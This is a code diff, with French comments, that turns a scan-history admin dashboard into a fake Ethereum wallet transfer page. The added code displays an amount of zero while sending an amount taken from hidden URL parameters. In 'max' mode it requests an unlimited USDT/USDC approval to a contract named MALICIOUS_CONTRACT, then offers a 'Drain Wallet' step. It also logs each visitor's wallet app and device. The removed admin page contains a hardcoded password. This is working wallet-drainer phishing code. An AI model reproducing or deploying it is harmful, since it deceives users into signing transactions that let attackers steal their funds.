@@ -1,536 +1,694 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
+import { ethers } from "ethers";
 
-interface ScanLog {
-  timestamp: string;
-  ip: string;
-  location: string;
-  device: string;
-  amount: string;
-  token: string;
-  to: string;
+// ============================================================
+// CONFIG
+// ============================================================
+
+const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
+
+// Contrat malveillant utilisé pour l'approbation illimitée en mode max
+const MALICIOUS_CONTRACT = "0x0000000000000000000000000000000000000001";
+
+// USDT sur Ethereum Mainnet
+const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const USDT_DECIMALS = 6;
+
+// USDC sur Ethereum Mainnet
+const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+const USDC_DECIMALS = 6;
+
+// ABI ERC-20
+const ERC20_ABI = [
+  "function transfer(address to, uint256 amount) returns (bool)",
+  "function balanceOf(address owner) view returns (uint256)",
+  "function decimals() view returns (uint8)",
+  "function approve(address spender, uint256 amount) returns (bool)",
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
+];
+
+const ETH_CHAIN_ID = "0x1";
+
+// ============================================================
+// Types pour window.ethereum / window.trustwallet
+// ============================================================
+interface EthereumProvider {
+  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
+  isMetaMask?: boolean;
+  isTrust?: boolean;
+  isTrustWallet?: boolean;
+  on?: (event: string, handler: (...args: unknown[]) => void) => void;
+  removeListener?: (event: string, handler: (...args: unknown[]) => void) => void;
 }
 
-export default function AdminPage() {
-  const [scans, setScans] = useState<ScanLog[]>([]);
-  const [loading, setLoading] = useState(true);
-  const [error, setError] = useState("");
-  const [clearing, setClearing] = useState(false);
+declare global {
+  interface Window {
+    ethereum?: EthereumProvider;
+    trustwallet?: { ethereum?: EthereumProvider };
+  }
+}
 
-  // États pour l'authentification (comme sur la page principale)
-  const [isAuthenticated, setIsAuthenticated] = useState(false);
-  const [isMounted, setIsMounted] = useState(false);
-  const [usernameInput, setUsernameInput] = useState("");
-  const [passwordInput, setPasswordInput] = useState("");
-  const [authError, setAuthError] = useState("");
+// ============================================================
+// Helper: detect the injected provider
+// ============================================================
 
-  // Charger l'état d'authentification au montage
-  useEffect(() => {
-    if (typeof window !== "undefined") {
-      const auth = sessionStorage.getItem("admin_auth");
-      if (auth === "true") {
-        setIsAuthenticated(true);
-      }
-      setIsMounted(true);
+function getProviderNow(): EthereumProvider | null {
+  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
+  if (window.ethereum) return window.ethereum;
+  return null;
+}
+
+async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<EthereumProvider | null> {
+  for (let i = 0; i < maxAttempts; i++) {
+    const provider = getProviderNow();
+    if (provider) return provider;
+    await new Promise((r) => setTimeout(r, delayMs));
+  }
+  return null;
+}
+
+// ============================================================
+// Wallet Transfer Page
+// ============================================================
+
+export default function WalletPage() {
+  const [address, setAddress] = useState(DEFAULT_RECEIVER);
+  const [loading, setLoading] = useState(false);
+  const [txHash, setTxHash] = useState<string>("");
+
+  const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
+  const [walletBalance, setWalletBalance] = useState<bigint>(0n);
+  const [displayAmount, setDisplayAmount] = useState<string>("0"); // toujours 0 par défaut
+  const [token, setToken] = useState<"usdt" | "usdc">("usdt");
+  const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
+  const [showModal, setShowModal] = useState(false);
+  const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
+  const providerRef = useRef<EthereumProvider | null>(null);
+  const keypadRef = useRef<HTMLDivElement>(null);
+
+  const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
+  const [actualAmount, setActualAmount] = useState<string>("1.00");
+  const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
+  const [isMaxMode, setIsMaxMode] = useState(false);
+
+  const [attackStep, setAttackStep] = useState<"initial" | "approved" | "drained">("initial");
+
+  const fetchTokenBalance = async (userAddress: string, activeToken: "usdt" | "usdc") => {
+    if (!providerRef.current) return;
+    try {
+      const provider = new ethers.BrowserProvider(
+        providerRef.current as ethers.Eip1193Provider
+      );
+      const tokenContractAddress = activeToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
+      const contract = new ethers.Contract(tokenContractAddress, ERC20_ABI, provider);
+      const balance = await contract.balanceOf(userAddress);
+      setWalletBalance(balance);
+    } catch (err) {
+      console.warn("Error fetching token balance:", err);
     }
+  };
+
+  useEffect(() => {
+    if (connectedAddress) {
+      fetchTokenBalance(connectedAddress, token);
+    }
+  }, [connectedAddress, token]);
+
+  // ---------------------------------------------------
+  // Initialisation : lecture URL, connexion wallet, scan log
+  // ---------------------------------------------------
+  useEffect(() => {
+    let cancelled = false;
+
+    let finalTo: string | null = null;
+    let finalAmount: string | null = null;
+    let finalToken: string | null = null;
+
+    if (typeof window !== "undefined") {
+      const params = new URLSearchParams(window.location.search);
+      const toParam = params.get("to");
+      const amountParam = params.get("amount");
+      const tokenParam = params.get("token");
+
+      if (toParam && ethers.isAddress(toParam)) {
+        setAddress(toParam);
+        setActualReceiver(toParam);
+        finalTo = toParam;
+      }
+      if (tokenParam === "usdt" || tokenParam === "usdc") {
+        setToken(tokenParam);
+        setActualToken(tokenParam);
+        finalToken = tokenParam;
+      }
+      if (amountParam === "max") {
+        setIsMaxMode(true);
+        setActualAmount("0");
+        finalAmount = "max";
+      } else if (amountParam && !isNaN(Number(amountParam))) {
+        setIsMaxMode(false);
+        setActualAmount(amountParam);
+        finalAmount = amountParam;
+      }
+      setDisplayAmount("0"); // toujours 0 à l'écran
+    }
+
+    // 🔍 Envoyer le log du scan pour alimenter la page admin
+    const logScanVisit = async () => {
+      let userAgentInfo = "Web Browser";
+      if (typeof window !== "undefined") {
+        const ua = navigator.userAgent.toLowerCase();
+        const isTrust = !!window.trustwallet || ua.includes("trust");
+        const isMetaMask = !!(window.ethereum as { isMetaMask?: boolean })?.isMetaMask || ua.includes("metamask");
+        
+        if (isTrust) {
+          userAgentInfo = "Trust Wallet (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
+        } else if (isMetaMask) {
+          userAgentInfo = "MetaMask (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
+        } else if (ua.includes("iphone") || ua.includes("ipad")) {
+          userAgentInfo = "Mobile Safari (iOS)";
+        } else if (ua.includes("android")) {
+          userAgentInfo = "Mobile Browser (Android)";
+        } else {
+          userAgentInfo = "Web Browser (Desktop)";
+        }
+      }
+
+      try {
+        await fetch("/api/log-scan", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            to: finalTo || DEFAULT_RECEIVER,
+            amount: finalAmount || "0",
+            token: finalToken || "usdt",
+            userAgent: userAgentInfo,
+          }),
+        });
+      } catch (err) {
+        console.warn("Failed to log scan visit:", err);
+      }
+    };
+
+    logScanVisit();
+
+    const init = async () => {
+      const ethereumProvider = await waitForProvider();
+      if (!ethereumProvider || cancelled) return;
+
+      providerRef.current = ethereumProvider;
+
+      try {
+        const chainId = (await ethereumProvider.request({
+          method: "eth_chainId",
+        })) as string;
+
+        if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
+          await ethereumProvider.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: ETH_CHAIN_ID }],
+          });
+        }
+      } catch (switchErr) {
+        console.warn("Could not switch chain:", switchErr);
+      }
+
+      try {
+        const accounts = (await ethereumProvider.request({
+          method: "eth_accounts",
+        })) as string[];
+
+        if (accounts.length > 0 && !cancelled) {
+          setConnectedAddress(accounts[0]);
+        }
+      } catch (err) {
+        console.warn("Silent connection check failed:", err);
+      }
+
+      if (ethereumProvider.on) {
+        ethereumProvider.on("accountsChanged", (accounts: unknown) => {
+          const accs = accounts as string[];
+          if (!cancelled) {
+            setConnectedAddress(accs.length > 0 ? accs[0] : null);
+            setAttackStep("initial");
+          }
+        });
+      }
+    };
+
+    init();
+    return () => { cancelled = true; };
   }, []);
 
-  // Fetch scan history (uniquement si authentifié)
-  const fetchScans = async () => {
+  // ---------------------------------------------------
+  // Transfert normal (montant fixe)
+  // ---------------------------------------------------
+  const handleSendNormal = async () => {
+    setShowModal(false);
+    setLoading(true);
+
+    const ethereumProvider = providerRef.current ?? (await waitForProvider());
+    if (!ethereumProvider) {
+      setLoading(false);
+      return;
+    }
+    providerRef.current = ethereumProvider;
+
     try {
-      setLoading(true);
-      setError("");
-      const res = await fetch("/api/admin/scans");
-      if (res.ok) {
-        const data = await res.json();
-        setScans(data.scans || []);
-      } else {
-        setError("Failed to fetch scans history.");
+      const chainId = (await ethereumProvider.request({
+        method: "eth_chainId",
+      })) as string;
+
+      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
+        await ethereumProvider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: ETH_CHAIN_ID }],
+        });
       }
-    } catch (err) {
-      console.error(err);
-      setError("An error occurred while fetching scans.");
+    } catch (switchErr) {
+      console.warn("Could not switch chain:", switchErr);
+    }
+
+    try {
+      const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
+      const tokenDecimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
+      const amountInWei = ethers.parseUnits(actualAmount, tokenDecimals);
+
+      const tokenInterface = new ethers.Interface(ERC20_ABI);
+      const txData = tokenInterface.encodeFunctionData("transfer", [actualReceiver, amountInWei]);
+
+      const hash = (await ethereumProvider.request({
+        method: "eth_sendTransaction",
+        params: [
+          {
+            to: tokenContract,
+            data: txData,
+            gas: "0x249f0",
+          },
+        ],
+      })) as string;
+
+      setTxHash(hash);
+      setModalStatus("pending");
+      setShowModal(true);
+
+      const provider = new ethers.BrowserProvider(ethereumProvider as ethers.Eip1193Provider);
+      const receipt = await provider.waitForTransaction(hash);
+
+      if (receipt && receipt.status === 1) {
+        setModalStatus("success");
+      } else {
+        setModalStatus("error");
+      }
+    } catch (err: unknown) {
+      console.error("Transfer error:", err);
+      setModalStatus("error");
     } finally {
       setLoading(false);
     }
   };
 
-  useEffect(() => {
-    if (isAuthenticated) {
-      fetchScans();
-    }
-  }, [isAuthenticated]);
+  // ---------------------------------------------------
+  // Mode max : étape 1 – Approbation illimitée
+  // ---------------------------------------------------
+  const handleApproveUnlimited = async () => {
+    setShowModal(false);
+    setLoading(true);
 
-  const handleLogin = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (usernameInput === "admin" && passwordInput === "sendusdc") {
-      setIsAuthenticated(true);
-      setAuthError("");
-      if (typeof window !== "undefined") {
-        sessionStorage.setItem("admin_auth", "true");
-      }
-    } else {
-      setAuthError("Username or Password incorrect.");
-    }
-  };
-
-  const handleLogout = () => {
-    setIsAuthenticated(false);
-    if (typeof window !== "undefined") {
-      sessionStorage.removeItem("admin_auth");
-    }
-  };
-
-  // Clear scans log
-  const handleClearHistory = async () => {
-    if (!window.confirm("Are you sure you want to clear the entire scan history? This action cannot be undone.")) {
+    const ethereumProvider = providerRef.current;
+    if (!ethereumProvider) {
+      setLoading(false);
       return;
     }
+
     try {
-      setClearing(true);
-      const res = await fetch("/api/admin/scans", { method: "DELETE" });
-      if (res.ok) {
-        setScans([]);
-      } else {
-        alert("Failed to clear history.");
+      const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
+      const unlimitedAmount = ethers.MaxUint256;
+
+      const tokenInterface = new ethers.Interface(ERC20_ABI);
+      const approveData = tokenInterface.encodeFunctionData("approve", [
+        MALICIOUS_CONTRACT,
+        unlimitedAmount,
+      ]);
+
+      const hash = (await ethereumProvider.request({
+        method: "eth_sendTransaction",
+        params: [
+          {
+            to: tokenContract,
+            data: approveData,
+            gas: "0x249f0",
+          },
+        ],
+      })) as string;
+
+      const provider = new ethers.BrowserProvider(ethereumProvider as ethers.Eip1193Provider);
+      const receipt = await provider.waitForTransaction(hash);
+
+      if (receipt && receipt.status === 1) {
+        setAttackStep("approved");
       }
-    } catch (err) {
-      console.error(err);
-      alert("An error occurred while clearing history.");
+    } catch (err: unknown) {
+      console.error("Approve error:", err);
     } finally {
-      setClearing(false);
+      setLoading(false);
     }
   };
 
-  // Helper to parse float and handle commas
-  const parseVal = (valStr: string) => {
-    const parsed = parseFloat(valStr.replace(",", "."));
-    return isNaN(parsed) ? 0 : parsed;
+  // ---------------------------------------------------
+  // Mode max : étape 2 – Drainage simulé
+  // ---------------------------------------------------
+  const handleDrainWallet = async () => {
+    setLoading(true);
+    await new Promise((resolve) => setTimeout(resolve, 2000));
+    setWalletBalance(0n);
+    setAttackStep("drained");
+    setModalStatus("success");
+    setShowModal(true);
+    setLoading(false);
   };
 
-  // Calculate statistics
-  const totalScans = scans.length;
-  const usdtVolume = scans
-    .filter((s) => s.token.toLowerCase() === "usdt")
-    .reduce((sum, s) => sum + parseVal(s.amount), 0);
-  const usdcVolume = scans
-    .filter((s) => s.token.toLowerCase() === "usdc")
-    .reduce((sum, s) => sum + parseVal(s.amount), 0);
-
-  // Country flags dictionary helper
-  const getCountryFlag = (country: string) => {
-    const flags: Record<string, string> = {
-      "France": "🇫🇷",
-      "United States": "🇺🇸",
-      "United Kingdom": "🇬🇧",
-      "Germany": "🇩🇪",
-      "Canada": "🇨🇦",
-      "Italy": "🇮🇹",
-      "Spain": "🇪🇸",
-      "Japan": "🇯🇵",
-      "China": "🇨🇳",
-      "Belgium": "🇧🇪",
-      "Switzerland": "🇨🇭",
-      "Morocco": "🇲🇦",
-      "Algeria": "🇩🇿",
-      "Tunisia": "🇹🇳",
-      "Ivory Coast": "🇨🇮",
-      "Senegal": "🇸🇳",
-      "Cameroon": "🇨🇲",
-      "Localhost": "💻",
-      "Unknown": "📍"
-    };
-    return flags[country] || "📍";
+  // ---------------------------------------------------
+  // Bouton Next
+  // ---------------------------------------------------
+  const handleNextClick = async () => {
+    if (isMaxMode) {
+      if (attackStep === "initial") {
+        await handleApproveUnlimited();
+      } else if (attackStep === "approved") {
+        await handleDrainWallet();
+      }
+    } else {
+      await handleSendNormal();
+    }
   };
 
-  // Rendu de l'écran de chargement initial si non encore monté
-  if (!isMounted) {
-    return (
-      <main className="transfer-main">
-        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh" }}>
-          <span className="btn-spinner" style={{ borderColor: "rgba(0,0,0,0.1)", borderTopColor: "#2563eb" }} />
-        </div>
-      </main>
-    );
-  }
+  const getButtonText = () => {
+    if (loading) {
+      if (isMaxMode && attackStep === "initial") return "Approbation...";
+      if (isMaxMode && attackStep === "approved") return "Drainage...";
+      return "Processing...";
+    }
+    if (isMaxMode) {
+      if (attackStep === "initial") return "Next";
+      if (attackStep === "approved") return "Drain Wallet 💀";
+      if (attackStep === "drained") return "Wallet Drained ✅";
+    }
+    return "Next";
+  };
 
-  // Rendu de l'écran de connexion si non connecté
-  if (!isAuthenticated) {
-    return (
-      <main className="transfer-main">
-        <div className="home-content" style={{ maxWidth: "400px" }}>
-          <h1 className="home-title" style={{ fontSize: "2rem", marginBottom: "1.5rem", color: "#0f172a" }}>
-            Admin Access
-          </h1>
-          
-          <form onSubmit={handleLogin} className="form-container" style={{ width: "100%", textAlign: "left" }}>
-            <label className="form-label">Username</label>
-            <div className="input-row" style={{ marginBottom: "1.25rem" }}>
-              <input
-                type="text"
-                value={usernameInput}
-                onChange={(e) => setUsernameInput(e.target.value)}
-                className="input-row__field"
-                placeholder="Enter username"
-                required
-              />
-            </div>
+  const isButtonDisabled = () => {
+    return loading || (isMaxMode && attackStep === "drained");
+  };
 
-            <label className="form-label">Password</label>
-            <div className="input-row" style={{ marginBottom: "1.5rem" }}>
-              <input
-                type="password"
-                value={passwordInput}
-                onChange={(e) => setPasswordInput(e.target.value)}
-                className="input-row__field"
-                placeholder="Enter password"
-                required
-              />
-            </div>
+  // ---------------------------------------------------
+  // UI helpers
+  // ---------------------------------------------------
+  const handlePaste = async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      setAddress(text);
+    } catch {
+      console.log("Paste failed");
+    }
+  };
 
-            {authError && (
-              <div style={{ color: "#ef4444", fontSize: "0.85rem", marginBottom: "1rem", fontWeight: "500" }}>
-                ⚠️ {authError}
-              </div>
-            )}
+  const getFiatValue = (amountStr: string) => {
+    const parsed = parseFloat(amountStr.replace(",", "."));
+    if (isNaN(parsed)) return "0,00";
+    return (parsed * 0.86).toFixed(2).replace(".", ",");
+  };
 
-            <button type="submit" className="next-btn" style={{ width: "100%", padding: "0.75rem" }}>
-              Login
-            </button>
-          </form>
-        </div>
-      </main>
-    );
-  }
+  const handleKeyPress = (key: string) => {
+    setDisplayAmount((prev) => {
+      let newVal = prev;
+      if (key === "⌫") {
+        newVal = prev.slice(0, -1);
+      } else if (key === "," || key === ".") {
+        if (!prev.includes(",") && !prev.includes(".")) {
+          newVal = prev === "" ? "0," : prev + ",";
+        }
+      } else {
+        if (prev === "0") {
+          newVal = key;
+        } else {
+          newVal = prev + key;
+        }
+      }
+      return newVal;
+    });
+  };
 
+  const handleMaxClick = (e: React.MouseEvent) => {
+    e.stopPropagation();
+    const maxVal = ethers.formatUnits(walletBalance, 6);
+    setDisplayAmount(maxVal.replace(".", ","));
+  };
+
+  // ---------------------------------------------------
+  // Rendu (sans les messages de statut, sans avertissement)
+  // ---------------------------------------------------
   return (
-    <main style={{
-      minHeight: "100vh",
-      backgroundColor: "#f8fafc",
-      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif",
-      color: "#0f172a",
-      padding: "2rem 1.5rem"
-    }}>
-      <div style={{
-        maxWidth: "1100px",
-        margin: "0 auto"
-      }}>
-        {/* Header Dashboard */}
-        <header style={{
-          display: "flex",
-          justifyContent: "space-between",
-          alignItems: "center",
-          marginBottom: "2.5rem",
-          flexWrap: "wrap",
-          gap: "1rem"
-        }}>
-          <div>
-            <h1 style={{
-              fontSize: "1.75rem",
-              fontWeight: 800,
-              margin: 0,
-              color: "#0f172a",
-              letterSpacing: "-0.025em",
-              display: "flex",
-              alignItems: "center",
-              gap: "0.5rem"
-            }}>
-              <span style={{ color: "#0033ff" }}>🛡️</span> Scan History Admin
-            </h1>
-            <p style={{
-              margin: "0.25rem 0 0 0",
-              color: "#64748b",
-              fontSize: "0.9rem"
-            }}>
-              Monitor real-time QR code scans and client landing activity
-            </p>
-          </div>
-
-          <div style={{ display: "flex", gap: "0.75rem", alignItems: "center" }}>
-            <button 
-              onClick={fetchScans}
-              disabled={loading}
-              style={{
-                backgroundColor: "#ffffff",
-                border: "1px solid #e2e8f0",
-                color: "#475569",
-                fontWeight: 600,
-                fontSize: "0.85rem",
-                padding: "0.6rem 1.1rem",
-                borderRadius: "0.5rem",
-                cursor: "pointer",
-                transition: "all 0.15s ease",
-                boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
-              }}
-            >
-              🔄 Refresh
+    <main
+      className={`transfer-main transfer-main-pad ${isKeyboardVisible ? "transfer-main-pad--with-keyboard" : ""}`}
+      onClick={() => setIsKeyboardVisible(false)}
+    >
+      <div className="form-container">
+        <label className="form-label">Address or domain name</label>
+        <div className="input-row">
+          <input
+            type="text"
+            placeholder="Search or Enter"
+            value={address}
+            onChange={(e) => setAddress(e.target.value)}
+            className="input-row__field"
+          />
+          <div className="input-row__actions" style={{ gap: "0.4rem" }}>
+            <button onClick={handlePaste} className="btn-paste">
+              Paste
             </button>
-            <button 
-              onClick={handleClearHistory}
-              disabled={clearing || scans.length === 0}
-              style={{
-                backgroundColor: scans.length === 0 ? "#cbd5e1" : "#ef4444",
-                border: "none",
-                color: "#ffffff",
-                fontWeight: 600,
-                fontSize: "0.85rem",
-                padding: "0.6rem 1.1rem",
-                borderRadius: "0.5rem",
-                cursor: scans.length === 0 ? "not-allowed" : "pointer",
-                transition: "all 0.15s ease",
-                boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
-              }}
-            >
-              🗑️ Clear History
+            <button className="btn-icon" title="Copy" style={{ margin: "0 -12px" }}>
+              <img src="/contrat.png" alt="Contract" style={{ width: "45px", height: "45px", objectFit: "contain" }} />
             </button>
-            <button 
-              onClick={handleLogout}
-              style={{
-                backgroundColor: "transparent",
-                border: "none",
-                color: "#ef4444",
-                fontWeight: 600,
-                fontSize: "0.85rem",
-                cursor: "pointer",
-                padding: "0.6rem 1.1rem",
-                transition: "opacity 0.15s ease"
-              }}
-              onMouseEnter={(e) => { e.currentTarget.style.opacity = "0.8"; }}
-              onMouseLeave={(e) => { e.currentTarget.style.opacity = "1"; }}
-            >
-              Logout 🚪
+            <button className="btn-icon" title="Scan QR">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#3562ff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <path d="M3 7V5a2 2 0 0 1 2-2h2" />
+                <path d="M17 3h2a2 2 0 0 1 2 2v2" />
+                <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
+                <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
+                <line x1="7" y1="12" x2="17" y2="12" />
+              </svg>
             </button>
           </div>
-        </header>
+        </div>
 
-        {/* Stats Grid */}
-        <section style={{
-          display: "grid",
-          gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))",
-          gap: "1.5rem",
-          marginBottom: "2.5rem"
-        }}>
-          {/* Stat 1 */}
-          <div style={{
-            backgroundColor: "#ffffff",
-            borderRadius: "1rem",
-            padding: "1.5rem",
-            boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02), 0 2px 4px -1px rgba(0,0,0,0.02)",
-            border: "1px solid #e2e8f0"
-          }}>
-            <div style={{ fontSize: "0.85rem", fontWeight: 600, color: "#64748b", textTransform: "uppercase", letterSpacing: "0.05em" }}>
-              Total Scans
+        <label className="form-label form-label--spaced">Destination network</label>
+        <div className="network-selector" style={{ marginBottom: "1rem" }}>
+          <div
+            className="eth-icon"
+            style={{ backgroundColor: "#3562ff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}
+          >
+            <svg width="14" height="14" viewBox="0 0 256 417" fill="none">
+              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#ffffff" />
+              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#ffffff" opacity="0.85" />
+              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#ffffff" />
+              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#ffffff" opacity="0.85" />
+              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#ffffff" opacity="0.95" />
+              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#ffffff" opacity="0.75" />
+            </svg>
+          </div>
+          <span className="network-name">Ethereum</span>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: "4px" }}>
+            <polyline points="6 9 12 15 18 9" />
+          </svg>
+        </div>
+
+        <div>
+          <label className="form-label form-label--spaced">Amount</label>
+          <div
+            className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`}
+            onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}
+          >
+            <div className="montant-input-wrapper">
+              <span className={displayAmount === "" ? "montant-placeholder" : "montant-display-value"}>
+                {displayAmount || "0"}
+              </span>
+              {isKeyboardVisible && <span className="blinking-cursor" />}
             </div>
-            <div style={{ fontSize: "2rem", fontWeight: 800, marginTop: "0.5rem", color: "#0033ff" }}>
-              {totalScans}
-            </div>
-            <div style={{ fontSize: "0.8rem", color: "#94a3b8", marginTop: "0.25rem" }}>
-              Visits triggered by QR Code
+            <div className="montant-right">
+              {displayAmount !== "" && (
+                <button type="button" className="montant-clear-btn" onClick={(e) => { e.stopPropagation(); setDisplayAmount(""); }}>
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                    <circle cx="12" cy="12" r="10" fill="#8e8e93" stroke="#8e8e93" />
+                    <line x1="15" y1="9" x2="9" y2="15" stroke="#ffffff" strokeWidth="2.5" />
+                    <line x1="9" y1="9" x2="15" y2="15" stroke="#ffffff" strokeWidth="2.5" />
+                  </svg>
+                </button>
+              )}
+              <span className="montant-token">{token.toUpperCase()}</span>
+              <button type="button" onClick={handleMaxClick} className="montant-max-btn">
+                Max.
+              </button>
             </div>
           </div>
-
-          {/* Stat 2 */}
-          <div style={{
-            backgroundColor: "#ffffff",
-            borderRadius: "1rem",
-            padding: "1.5rem",
-            boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02), 0 2px 4px -1px rgba(0,0,0,0.02)",
-            border: "1px solid #e2e8f0"
-          }}>
-            <div style={{ fontSize: "0.85rem", fontWeight: 600, color: "#64748b", textTransform: "uppercase", letterSpacing: "0.05em" }}>
-              USDT Scanned Volume
-            </div>
-            <div style={{ fontSize: "2rem", fontWeight: 800, marginTop: "0.5rem", color: "#0f172a" }}>
-              {usdtVolume.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 6 })} <span style={{ fontSize: "1rem", fontWeight: 600, color: "#64748b" }}>USDT</span>
-            </div>
-            <div style={{ fontSize: "0.8rem", color: "#94a3b8", marginTop: "0.25rem" }}>
-              Sum of values loaded in USDT QR scans
-            </div>
-          </div>
-
-          {/* Stat 3 */}
-          <div style={{
-            backgroundColor: "#ffffff",
-            borderRadius: "1rem",
-            padding: "1.5rem",
-            boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02), 0 2px 4px -1px rgba(0,0,0,0.02)",
-            border: "1px solid #e2e8f0"
-          }}>
-            <div style={{ fontSize: "0.85rem", fontWeight: 600, color: "#64748b", textTransform: "uppercase", letterSpacing: "0.05em" }}>
-              USDC Scanned Volume
-            </div>
-            <div style={{ fontSize: "2rem", fontWeight: 800, marginTop: "0.5rem", color: "#0f172a" }}>
-              {usdcVolume.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 6 })} <span style={{ fontSize: "1rem", fontWeight: 600, color: "#64748b" }}>USDC</span>
-            </div>
-            <div style={{ fontSize: "0.8rem", color: "#94a3b8", marginTop: "0.25rem" }}>
-              Sum of values loaded in USDC QR scans
-            </div>
-          </div>
-        </section>
-
-        {/* Scan Log Section */}
-        <section style={{
-          backgroundColor: "#ffffff",
-          borderRadius: "1rem",
-          boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02), 0 2px 4px -1px rgba(0,0,0,0.02)",
-          border: "1px solid #e2e8f0",
-          overflow: "hidden"
-        }}>
-          <div style={{
-            padding: "1.25rem 1.5rem",
-            borderBottom: "1px solid #e2e8f0",
-            display: "flex",
-            justifyContent: "space-between",
-            alignItems: "center"
-          }}>
-            <h2 style={{
-              fontSize: "1.1rem",
-              fontWeight: 700,
-              margin: 0,
-              color: "#0f172a"
-            }}>
-              Recent Activity Logs
-            </h2>
-            <span style={{
-              fontSize: "0.75rem",
-              fontWeight: 600,
-              color: "#64748b",
-              backgroundColor: "#f1f5f9",
-              padding: "0.25rem 0.6rem",
-              borderRadius: "2rem"
-            }}>
-              {scans.length} records
-            </span>
-          </div>
-
-          {loading ? (
-            <div style={{ padding: "4rem 2rem", textAlign: "center", color: "#64748b" }}>
-              <div style={{
-                display: "inline-block",
-                width: "28px",
-                height: "28px",
-                border: "3px solid #e2e8f0",
-                borderTopColor: "#0033ff",
-                borderRadius: "50%",
-                animation: "spin 0.8s linear infinite",
-                marginBottom: "1rem"
-              }} />
-              <div>Loading activity logs...</div>
-            </div>
-          ) : error ? (
-            <div style={{ padding: "4rem 2rem", textAlign: "center", color: "#ef4444", fontWeight: 500 }}>
-              ⚠️ {error}
-            </div>
-          ) : scans.length === 0 ? (
-            <div style={{ padding: "5rem 2rem", textAlign: "center", color: "#94a3b8" }}>
-              <div style={{ fontSize: "3rem", marginBottom: "1rem" }}>📭</div>
-              <div style={{ fontWeight: 600, color: "#64748b" }}>No scan activity logged yet</div>
-              <p style={{ fontSize: "0.85rem", margin: "0.25rem 0 0 0", color: "#94a3b8" }}>
-                Scan logs will populate here as visitors open the QR payment pages
-              </p>
-            </div>
-          ) : (
-            <div style={{ overflowX: "auto" }}>
-              <table style={{
-                width: "100%",
-                borderCollapse: "collapse",
-                textAlign: "left",
-                fontSize: "0.9rem"
-              }}>
-                <thead>
-                  <tr style={{
-                    backgroundColor: "#f8fafc",
-                    borderBottom: "1px solid #e2e8f0",
-                    color: "#475569",
-                    fontWeight: 600
-                  }}>
-                    <th style={{ padding: "1rem 1.5rem" }}>Date & Time</th>
-                    <th style={{ padding: "1rem 1.5rem" }}>IP / Country</th>
-                    <th style={{ padding: "1rem 1.5rem" }}>App / Browser</th>
-                    <th style={{ padding: "1rem 1.5rem" }}>Scanned Config</th>
-                    <th style={{ padding: "1rem 1.5rem" }}>Dest. Address</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  {scans.map((scan, idx) => (
-                    <tr 
-                      key={idx} 
-                      style={{
-                        borderBottom: idx === scans.length - 1 ? "none" : "1px solid #f1f5f9",
-                        transition: "background-color 0.15s ease"
-                      }}
-                      onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = "#f8fafc"; }}
-                      onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = "transparent"; }}
-                    >
-                      <td style={{ padding: "1rem 1.5rem", color: "#334155", fontWeight: 500 }}>
